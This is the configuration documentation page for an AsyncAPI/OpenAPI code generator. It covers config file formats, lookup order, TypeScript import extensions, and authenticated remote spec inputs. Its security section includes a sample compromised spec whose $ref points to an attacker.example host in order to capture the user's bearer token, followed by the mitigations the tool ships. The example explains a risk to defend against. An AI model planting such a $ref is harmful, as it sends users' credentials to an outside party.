---
sidebar_position: 4
---

# Configurations

There are 5 possible configuration file types, `json`, `yaml`, `esm` (ECMAScript modules JavaScript), `cjs` (CommonJS modules JavaScript) and `ts` (TypeScript).

The only difference between them is what they enable you to do. The difference is `callbacks`, in a few places, you might want to provide a callback to control certain behavior in the generation library.

For example, with the [`custom`](./generators/custom.md) generator, you provide a callback to render something, this is not possible if your configuration file is either `json` or `yaml` format.

Reason those two exist, is because adding a `.js` configuration file to a Java project, might confuse developers, and if you dont need to take advantage of the customization features that require callback, it will probably be better to use one of the other two.

## Creating Configurations with the CLI

The easiest way to create a configuration file is by using the `codegen init` command. This interactive command will guide you through setting up a configuration file for your project, allowing you to specify:

- Input file (AsyncAPI or OpenAPI document)
- Configuration file type (`esm`, `json`, `yaml`, `ts`)
- Output directory
- Language and generation options

```sh
codegen init --input-file ./ecommerce.yml --input-type asyncapi --config-type ts --languages typescript
```

For detailed usage instructions and all available options, see the [CLI usage documentation](./usage.md#codegen-init).

## Configuration File Lookup

If no explicit configuration file is sat, it will be looked for in the following order:
- package.json
- .codegenrc
- .codegenrc.json
- .codegenrc.yaml
- .codegenrc.yml
- .codegenrc.js
- .codegenrc.ts
- .codegenrc.cjs
- .config/codegenrc
- .config/codegenrc.json
- .config/codegenrc.yaml
- .config/codegenrc.yml
- .config/codegenrc.js
- .config/codegenrc.ts
- .config/codegenrc.mjs
- .config/codegenrc.cjs
- codegen.config.js
- codegen.config.ts
- codegen.config.mjs
- codegen.config.cjs
- codegen.json
- codegen.yaml
- codegen.yml
- codegen.js
- codegen.ts
- codegen.mjs
- codegen.cjs

## TypeScript Configuration

When generating TypeScript code, you can configure global options that apply to all generators. These options can be overridden per-generator if needed.

### Import Extensions (node16/nodenext/verbatimModuleSyntax)

Modern TypeScript projects using strict ESM settings (`moduleResolution: "node16"` or `"nodenext"`, or `verbatimModuleSyntax: true`) require explicit file extensions in import statements. Use the `importExtension` option to configure this:

```javascript
// codegen.config.mjs
export default {
  inputType: 'asyncapi',
  inputPath: './asyncapi.json',
  language: 'typescript',
  importExtension: '.ts',  // Required for moduleResolution: "node16"

  generators: [
    { preset: 'payloads', outputPath: './src/payloads' },
    { preset: 'channels', outputPath: './src/channels', protocols: ['nats'] }
  ]
};
```

#### Import Extension Options

| Value | When to Use | tsconfig Settings |
|-------|-------------|-------------------|
| `"none"` (default) | Bundlers (webpack, vite) or classic Node.js | `moduleResolution: "node"` or `"bundler"` |
| `".ts"` | Modern ESM with TypeScript sources | `moduleResolution: "node16"/"nodenext"` + `allowImportingTsExtensions: true` |
| `".js"` | Compiled ESM output | `moduleResolution: "node16"/"nodenext"` (without `allowImportingTsExtensions`) |

#### Automatic Detection

When `importExtension` is not explicitly set in your configuration, the codegen automatically detects the appropriate setting based on your project setup. This enables zero-configuration support for most projects.

**Detection priority:**

1. **Bundler config files** (`vite.config.ts`, `webpack.config.js`, `next.config.js`, etc.) → `"none"`
2. **Bundler in dependencies** (vite, webpack, esbuild, rollup, parcel) → `"none"`
3. **`moduleResolution: "bundler"`** in tsconfig.json → `"none"`
4. **`moduleResolution: "node16"/"nodenext"` + `allowImportingTsExtensions: true`** → `".ts"`
5. **`moduleResolution: "node16"/"nodenext"`** (without allowImportingTsExtensions) → `".js"`
6. **Otherwise** → Uses default (`"none"`)

When detection occurs, you'll see an info message:
```
Auto-detected importExtension: '.js'
```

**Note:** You can always override automatic detection by explicitly setting `importExtension` in your configuration.

**Limitation:** Automatic detection only affects `channels` and `client` generators. The `payloads`, `parameters`, `headers`, and `models` generators use Modelina which doesn't currently support import extensions.

#### Per-Generator Override

You can override the global setting for individual generators:

```javascript
export default {
  inputType: 'asyncapi',
  inputPath: './asyncapi.json',
  language: 'typescript',
  importExtension: '.ts',  // Global default
  generators: [
    { preset: 'payloads', outputPath: './src/payloads' },  // Uses global .ts
    { preset: 'channels', outputPath: './src/channels', importExtension: 'none' }  // Override
  ]
};
```

## Remote URL inputs

`inputPath` accepts an `http://` or `https://` URL in addition to a local
file path. The same configuration field is used for AsyncAPI, OpenAPI, and
JSON Schema inputs:

```javascript
export default {
  inputType: 'asyncapi',
  inputPath: 'https://example.com/specs/asyncapi.yaml',
  language: 'typescript',
  generators: [
    { preset: 'payloads', outputPath: './src/payloads' }
  ]
};
```

Format detection prefers the response `Content-Type` header
(`application/json` → JSON, `*yaml*` → YAML), falling back to the URL
extension and finally to JSON-then-YAML for ambiguous cases.

External `$ref` targets (e.g. `$ref:
'https://example.com/components.yaml#/components/schemas/Pet'`) are also
resolved over the same code path for AsyncAPI and OpenAPI inputs.

### Authenticating remote requests

For specs hosted behind authentication, configure the `auth` field. Three
shapes are supported:

```javascript
// Bearer token
auth: { type: 'bearer', token: process.env.API_TOKEN }

// API key in a custom header
auth: { type: 'apiKey', header: 'X-API-Key', value: process.env.API_KEY }

// Arbitrary headers
auth: {
  type: 'custom',
  headers: {
    Authorization: `Bearer ${process.env.API_TOKEN}`,
    'X-Tenant': 'acme'
  }
}
```

The `auth` field is ignored when `inputPath` is a local file path.

### Auth scope and security considerations

**The configured authentication headers are sent to every URL the loader
fetches**, including:

- The root `inputPath` URL.
- Every external `$ref` target the parser libraries follow during
  dereferencing — even when the `$ref` points at a different host.

This is the right default for typical internal-SSO setups where the root
spec and its `$ref` chain share an auth boundary, but it means that **a
compromised spec can exfiltrate your token**:

```yaml
# Compromised spec at https://api.example.com/openapi.yaml
openapi: 3.0.0
paths:
  /users:
    get:
      responses:
        '200':
          content:
            application/json:
              schema:
                $ref: 'https://attacker.example/exfil.yaml'   # ← receives your token
```

**Mitigations shipped today** (no extra config required):

1. **Per-URL debug log** — every fetched URL is logged at `debug` level
   (`[remote-fetch] GET <url>`). With `--logLevel debug` you can audit
   exactly which hosts received your auth.
2. **Cross-host info-level warning** — when a `$ref` points at a host
   different from the root `inputPath`'s host, an `info` log is emitted
   once per distinct cross-host destination:
   `[remote-fetch] auth headers sent to '<host>' while resolving $ref
   from '<root-host>'. If this is unexpected, review the spec.`
3. **Schema-level warning** — the `auth` field's JSON schema description
   carries the security warning so it shows in IDE tooltips and
   schema-driven autocomplete.

**Deferred to follow-up issues:**

- Per-host auth maps (e.g. `auth: { 'api.acme.com': { type: 'bearer', ... } }`).
- Auth-host allowlist (only send auth to listed hosts).
- Disabling external `$ref` resolution entirely.

### Watch mode

`--watch` only observes the local filesystem. When `inputPath` is a
remote URL, the input watcher is skipped and a warning is logged. Use
`--watchPath` to watch a local file that triggers regeneration (which
will re-fetch the URL) on change.
